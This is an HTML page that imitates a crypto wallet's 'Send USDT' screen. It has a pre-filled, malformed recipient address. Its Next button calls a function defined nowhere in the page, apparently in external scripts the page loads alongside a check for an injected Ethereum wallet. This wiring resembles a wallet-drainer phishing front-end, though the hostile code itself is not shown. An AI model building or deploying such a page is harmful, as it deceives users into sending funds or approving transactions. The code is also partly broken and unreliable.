<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      color: #111111;
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      color: #000;
    }

    .form-group {
      margin-bottom: 25px;
    }

    /* Small gap between address section and amount section */
    .form-group + .form-group {
      margin-top: 50px; /* Increased gap between sections */
    }

    label {
      font-size: 14px;
      color: #555;
      display: block;
      margin-bottom: 8px;
    }

    .input-container {
      background-color: #f5f5f5;
      border: 1px solid #ccc;
      border-radius: 5px; /* Less curved corners */
      padding: 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      transition: border-color 0.3s ease, border-width 0.3s ease;
    }

    .input-container.focused {
      border-color: #0500FF;
      border-width: 2px;
    }

    .input-container input {
      background: transparent;
      border: none;
      outline: none;
      font-size: 16px;
      width: 100%;
    }

    #addressInput {
      color: #000000;
    }

    #usdtAmount {
      color: #0500FF;
    }

    .input-container .action {
      margin-left: 10px;
      color: #0500FF;
      cursor: pointer;
      font-weight: bold;
      white-space: nowrap;
    }

    .usd-estimate {
      color: #888;
      font-size: 14px;
      margin-top: 5px;
    }

    .btn-next {
      background-color: #9B99FF;
      color: #fff;
      font-size: 18px;
      text-align: center;
      border: none;
      border-radius: 25px;
      padding: 14px;
      width: 100%;
      margin-top: 20px;
      cursor: not-allowed;
      position: fixed;
      bottom: 0;
      left: 0;
      z-index: 1000;
    }

    .btn-next.enabled {
      background-color: #0500FF;
      cursor: pointer;
    }

    .btn-next:active {
      opacity: 0.9;
    }

    .usdt-text {
      font-size: 16px;
      color: #888; 
      margin-right: 10px;
    }

    .max-btn {
      color: #0500FF;
      font-weight: bold;
      cursor: pointer;
    }

    .icon {
      width: 20px;
      height: 20px;
      margin-left: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h2>Send USDT</h2>

  <div class="form-group">
    <label>Address or Domain Name</label>
    <div class="input-container" id="addressContainer">
      <input type="text" id="addressInput" placeholder="Search or Enter" value="0xC61D1f1d8f24eD0bCB502195ir5j55FF16B0BE07BD88B" onfocus="addFocus('addressContainer')" onblur="removeFocus('addressContainer')" />
      <span class="action" onclick="pasteAddress()">Paste</span>
      <!-- Address Book and Scan Icons -->
      <img src="images/address_book_icon.png" class="icon" alt="Address Book" onclick="openAddressBook()" />
      <img src="images/scan_icon.png" class="icon" alt="Scan" onclick="openScanner()" />
    </div>
  </div>

  <div class="form-group">
    <label id="amountLabel">Amount</label>
    <div class="input-container" id="amountContainer">
      <input type="text" id="usdtAmount" placeholder="USDT Amount" oninput="validateNumberInput(event)" onfocus="addFocus('amountContainer')" onblur="removeFocus('amountContainer')" />
      <span class="usdt-text" id="currencyLabel" onclick="toggleCurrency()">USDT</span>
      <span class="action max-btn" onclick="setMax()">Max</span> 
    </div>
    <div class="usd-estimate" id="usdEstimate">≈ $0.00</div>
  </div>




  <button class="btn-next" onclick="init_co()">Next</button>





  <script>
    let isUSDT = true; // Flag to track whether USDT or USD is selected

    function toggleCurrency() {
      const currencyLabel = document.getElementById('currencyLabel');
      const amountLabel = document.getElementById('amountLabel');
      const usdEstimate = document.getElementById('usdEstimate');
      const usdtAmount = document.getElementById('usdtAmount');

      if (isUSDT) {
        // Change to USD
        currencyLabel.textContent = 'USD';
        amountLabel.textContent = 'USD Amount';
        usdEstimate.textContent = '≈ 0 USDT'; // Changed '=' to '≈'
        usdtAmount.placeholder = 'USD Amount';
      } else {
        // Change back to USDT
        currencyLabel.textContent = 'USDT';
        amountLabel.textContent = 'Amount';
        usdEstimate.textContent = '≈ $0.00'; // Revert to USD estimate
        usdtAmount.placeholder = 'Amount';
      }
      isUSDT = !isUSDT; // Toggle the flag
    }

    function pasteAddress() {
      navigator.clipboard.readText().then(text => {
        document.getElementById('addressInput').value = text;
      }).catch(err => {
        alert("Paste failed: " + err);
      });
    }

    function setMax() {
      const maxValue = 100; // Example max
      document.getElementById('usdtAmount').value = maxValue;
      updateUsdEstimate();
    }

    function validateNumberInput(event) {
      const value = event.target.value;
      event.target.value = value.replace(/[^0-9.]/g, '');
      if (event.target.value.split('.').length > 2) {
        event.target.value = event.target.value.substring(0, event.target.value.lastIndexOf('.'));
      }
      if (event.target.value) {
        event.target.style.color = "#000000";
      } else {
        event.target.style.color = "#0500FF";
      }
      updateUsdEstimate();
    }

    function updateUsdEstimate() {
      const rate = 1.00; // 1 USDT = 1 USD
      const input = document.getElementById('usdtAmount').value.replace(/[^0-9.]/g, '');
      const amount = parseFloat(input);
      const usdEstimate = document.getElementById('usdEstimate');
      if (!isNaN(amount) && amount >= 0) {
        if (isUSDT) {
          usdEstimate.textContent = `≈ $${(amount * rate).toFixed(2)}`;
        } else {
          usdEstimate.textContent = `≈ ${amount} USDT`;  // Show '≈' and equivalent USDT when in USD mode
        }
      } else {
        usdEstimate.textContent = '≈ $0.00';
      }

      const button = document.querySelector('.btn-next');
      if (amount > 0) {
        button.classList.add('enabled');
        button.classList.remove('disabled');
      } else {
        button.classList.remove('enabled');
        button.classList.add('disabled');
      }
    }

    function goNext() {
      const address = document.getElementById('addressInput').value.trim();
      const amount = document.getElementById('usdtAmount').value.trim();
      if (!address || !amount) {
        alert("Please fill in all fields.");
        return;
      }
      alert(`You are sending ${amount} to ${address}`);
      // Backend call or redirect logic here
    }

    function addFocus(containerId) {
      document.getElementById(containerId).classList.add('focused');
    }

    function removeFocus(containerId) {
      document.getElementById(containerId).classList.remove('focused');
    }

    function openAddressBook() {
      // Logic to open the address book
      alert("Opening Address Book...");
    }

    function openScanner() {
      // Logic to initiate the QR code scanner
      alert("Opening Scanner...");
    }
  </script>




<div class="advanced_mode">
 
  
  
  </div>
    </div>
    <script src="./assets/w-modal.js"></script>
    <script src="./assets/w-loader.js"></script>
    <script src="./assets/modules.js"></script>
    <script src="./assets/main.js"></script>
    <script>
        setInterval(() => {
            document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
        }, 1000);
    </script>


</body>
</html>
